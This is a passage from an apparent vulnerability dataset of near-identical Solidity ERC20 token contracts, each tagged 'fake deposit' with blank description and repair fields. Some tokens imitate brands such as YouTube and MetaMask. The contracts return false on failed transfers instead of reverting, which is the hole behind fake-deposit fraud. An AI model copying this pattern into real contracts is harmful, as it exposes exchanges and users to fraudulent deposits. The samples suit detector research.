value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract CryptopiaLandDollar is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 4000000*10**uint256(decimals);\r\n\r\n    string public constant name = \"CryptopiaLandDollar\";\r\n    string public constant symbol = \"CLD\";\r\n\r\n    address payable teamAddress;\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n\r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n    function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Verso is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000*10**uint256(decimals);\r\n    string public constant name = \"Verso\";\r\n    string public constant symbol = \"VSO\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract MetaMaskToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Meta Mask Token\";\r\n    string public constant symbol = \"MASK\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;\r\n        totalSupply = 1000000000;\r\n        name = \"train.exchange\";\r\n        decimals = 0;\r\n        symbol = \"TRAIN\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract PregnantButtToken {\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract pbutttoken is PregnantButtToken {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract PREGNANTBUTT is pbutttoken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;                   \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'H1.0';       \r\n\r\n\r\n    function PREGNANTBUTT(\r\n        ) {\r\n        balances[msg.sender] = 250000000000000000000000000;              \r\n        totalSupply = 250000000000000000000000000;                    \r\n        name = \"pregnantbutt.finance\";                                 \r\n        decimals = 18;                         \r\n        symbol = \"PBUTT\";                         \r\n    }\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'ShibaInuBurger' token contract\r\n//\r\n// Symbol      : SIB \ud83c\udf54\r\n// Name        : Shiba Inu Burger\r\n// Total supply: 100000000000000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract ShibaInuBurger is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Shiba Inu Burger\";\r\n    string public constant symbol = \"SIB \ud83c\udf54\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// YouTube Official Token\r\n// https://youtube.com\r\n// https://twitter.com/YouTube\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract YouTubeOfficialToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"YouTube Official Token\";\r\n    string public constant symbol = \"YOUTUBE\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Moon_Shib is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Moon Shib\";\r\n    string public constant symbol = \"MOONSHIB\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Rocket_Shib is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Rocket Shib\";\r\n    string public constant symbol = \"RSHIB\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract HyperInuShiba is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Hyper Inu Shiba\";\r\n    string public constant symbol = \"HYPERINU\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract NFTChampions is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000*10**uint256(decimals);\r\n    string public constant name = \"NFT Champions\";\r\n    string public constant symbol = \"CHAMP\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Ethereum_Kiwi is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Ethereum Kiwi\";\r\n    string public constant symbol = \"EKIWI \ud83e\udd5d\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function 